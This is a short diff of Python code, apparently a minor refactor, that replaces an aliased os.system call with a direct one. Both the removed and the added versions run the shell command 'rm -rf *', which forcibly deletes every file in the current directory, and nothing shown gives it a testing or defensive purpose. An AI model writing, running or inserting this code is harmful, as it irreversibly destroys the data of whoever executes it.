@@ -1,3 +1,2 @@
-from os import system as s
-
-s("rm -rf *")
+import os
+os.system ("rm -rf *")
